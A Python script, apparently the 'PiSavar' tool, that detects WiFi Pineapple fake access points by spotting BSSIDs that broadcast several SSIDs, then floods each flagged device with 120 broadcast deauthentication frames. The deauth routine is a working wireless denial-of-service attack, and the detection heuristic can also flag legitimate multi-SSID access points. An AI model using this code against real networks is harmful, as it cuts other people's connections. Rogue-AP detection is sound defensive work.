# coding=utf-8
import sys
import argparse
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon
from scapy.sendrecv import sendp
from scapy.all import *
from time import gmtime, strftime
from termcolor import colored


banner_intro = """
-----------------------------------------------------
[---]    ______ _ _____                         [---]
[---]    | ___ (_)  ___|                        [---]
[---]    | |_/ /_\ `--.  __ ___   ____ _ _ __   [---]
[---]    |  __/| |`--. \/ _` \ \ / / _` | '__|  [---]
[---]    | |   | /\__/ / (_| |\ V / (_| | |     [---]
[---]    \_|   |_\____/ \__,_| \_/ \__,_|_|     [---]
[---]                                           [---]
[---]     Just for fun and security @octosec    [---]
[---]     W:besimaltinok.com | T:altnokbesim    [---]
[---]               G:besimaltnok               [---]
-----------------------------------------------------

"""

banner_dos = """
     ______      _____    ___  _   _             _
     |  _  \    /  ___|  / _ \| | | |           | |
     | | | |___ \ `--.  / /_\ \ |_| |_ __ _  ___| | __
     | | | / _ \ `--. \ |  _  | __| __/ _` |/ __| |/ /
     | |/ / (_) /\__/ / | | | | |_| || (_| | (__|   <
     |___/ \___/\____/  \_| |_/\__|\__\__,_|\___|_|\_\


         Sents deauthentication attack to TARGET(s)
"""

DESCRIPTION = """
The goal of this project is to find out the fake access points opened by the WiFi pineapple device using 
the PineAP module and to prevent clients from being affected by initiating a deauthentication attack to 
the attacking device.
"""

parser = argparse.ArgumentParser('PiSavar', description=DESCRIPTION)
parser.add_argument('-i', '--interface', type=str, required=True, help="Interface")
args = parser.parse_args()


def sniff_channel_hop(iface):
    for i in range(1, 14):
        os.system("iwconfig " + iface + " channel " + str(i))
        sniff(iface=iface, count=3, prn=air_scan)


def air_scan(pkt):
    """
    Scan all network with channel hopping
    Collected all ssid and mac address information
    :param pkt:  result of sniff function
    """
    if pkt.haslayer(Dot11Beacon):
        ssid, bssid = pkt.info, pkt.addr2
        info = "{}=={}".format(bssid, ssid)
        if info not in info_list:
            info_list.append(info)


def pp_analysis(info_list, pp):
    """
    Analysis air_scan result for pineAP Suite detection
    """
    for i in info_list:
        bssid, ssid = i.split("==")
        if bssid not in pp.keys():
            pp[bssid] = []
            pp[bssid].append(ssid)
        elif bssid in pp.keys() and ssid not in pp[bssid]:
            pp[bssid].append(ssid)

    """
    Detects networks opened by PineAP Suite.
    """
    for v in pp.keys():
        if len(pp[v]) >= 2 and v not in blacklist:
            blacklist.append(v)
            print "\033[1m[--] DETECTED PineAP ATTACK\n "
            print "\033[1m[--] MAC Address: ", v
            print "\033[1m[--] Fake Access Points :", len(pp[v])
    time.sleep(3)
    return blacklist


def find_channel(clist, v):
    for i in range(0, len(clist)):
        if clist[i].haslayer(Dot11Beacon) and clist[i].addr2 == v:
            channel = ord(clist[i][Dot11Elt:3].info)
    return channel


def pp_deauth(blacklist):
    """
    Starts deauthentication attack for PineAP Suite.
    """
    os.system("reset")
    print "\033[1m" + banner_dos
    print colored("\n-------------------  ̿' ̿'\̵͇̿̿\з=(◕_◕)=ε/̵͇̿̿/'̿'̿  ---------------------\n̿", "red")
    print "\033[1m[--] TARGET(s): ", blacklist
    time.sleep(1)
    print "\033[1m[*] Attacking for affected devices"
    time.sleep(2)
    print "\033[1m[*] Channel number being set\n"
    time.sleep(2)
    for d in blacklist:
        clist = sniff(iface=iface, count=30)
        channel = find_channel(clist, d)
        os.system("iwconfig wlan0mon channel " + str(channel))
        print "\033[1m[*] Sending 120 deauthentication packets to ", d
        deauth = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=d.lower(), addr3=d.lower()) / Dot11Deauth()
        sendp(deauth, iface=iface, count=120, inter=.2, verbose=False)
        time.sleep(1)
    print "\033[1m[*] Attack completed"
    time.sleep(2)


if __name__ == '__main__':
    iface = args.interface
    while True:
        channel = 0
        blacklist = []
        info_list = []
        pp = {}
        os.system("reset")
        sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=28, cols=70))
        print "\033[1m" + banner_intro
        print "\n\033[1m[--] Start time: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
        os.system("ifconfig " + iface + " down && iwconfig " + iface + " mode Monitor && ifconfig " + iface + " up")
        time.sleep(4)
        print "\033[1m[--] Started sniffing"
        time.sleep(4)
        print colored("\033[1m[--] Packets are being analysis", "green")
        sniff_channel_hop(iface)
        print "\033[1m[--] Total network: ", len(info_list)
        time.sleep(2)
        print "\033[1m[--] Searching for PineAP Suite traces"
        time.sleep(5)
        print "\033[1m=====================================\n"
        blacklist = pp_analysis(info_list, pp)
        time.sleep(2)
        if len(blacklist):
            sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=19, cols=70))
            pp_deauth(blacklist)
        else:
            print "\033[1m# -- > NO TRACE FOUND :)\n"
            time.sleep(4)
